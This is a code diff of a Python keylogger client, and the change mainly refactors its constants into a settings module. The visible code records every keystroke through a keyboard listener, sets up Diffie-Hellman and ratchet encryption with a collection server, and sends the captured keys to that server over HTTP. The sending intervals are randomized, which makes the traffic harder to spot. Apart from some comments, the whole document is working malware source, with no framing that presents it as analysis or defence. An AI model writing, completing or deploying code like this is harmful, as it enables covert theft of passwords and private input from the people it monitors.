@@ -11,22 +11,15 @@ import requests
 import random
 import sys
 import base64
+from settings import *
 
-
-# constants
-SEND_URL = "/home"
-KEY_URL = "/login"
-INTERVAL_SEND = 10
-SERVER_IP = "localhost"
-SERVER_PORT = 8000
-EXCHANGE_MSG_MAX = 3
-USE_POST = True
 
 # global variables
 exchanged_msgs = 0
 
 
 class Keylogger:
+
 
     def __init__(self, interval, ip, port):
         self.interval = interval
@@ -38,6 +31,7 @@ class Keylogger:
         self.__start_connection()
         self.__pair_pkey()
         
+
     def __start_connection(self):
         # send public key in Session Header to pair the connection
         key = self.__r.getPublicKey()
@@ -45,6 +39,7 @@ class Keylogger:
         response = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
         if 'Location' in response.headers:
             self.server_key = "/"+response.headers['Location']
+
 
     def __pair_pkey(self):
         global exchanged_msgs
@@ -56,9 +51,11 @@ class Keylogger:
         dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
         self.__r.pairComm(dhpub)
 
+
     # function to add the pressed keys to the current ones
     def __append_to_log(self, string):
         self.log = self.log + string
+
 
     # process the pressed key
     def __process_pressed_key(self, key):
@@ -74,6 +71,7 @@ class Keylogger:
             else:
                 current_key = "<" + str(key) + ">"
         self.__append_to_log(current_key)
+
 
     def __send_2_server(self):
         # if no keys were pressed, do nothing
@@ -97,6 +95,7 @@ class Keylogger:
                 headers = {'Session': base64.b64encode(key)}
                 _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
 
+
     # function to send the user input in the given interval
     def __report(self):
         r = random.randint(0, 10)
@@ -105,6 +104,7 @@ class Keylogger:
         timer = Timer(self.interval+r, self.__report)
         timer.start()
         # cada cierto tiempo hay que actualizar mover el ratchet del servidor!!!
+
 
     def start(self):
         print("started")
@@ -119,11 +119,13 @@ class Keylogger:
             # waiting the listener to finish
             self.__keyboard_listener.join()
     
+
     def exit(self):
         self.__keyboard_listener.stop()
         requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + '/logout')
 
 
+# timers are randomized
 random.seed(10)
 keylogger = None
 while (True):
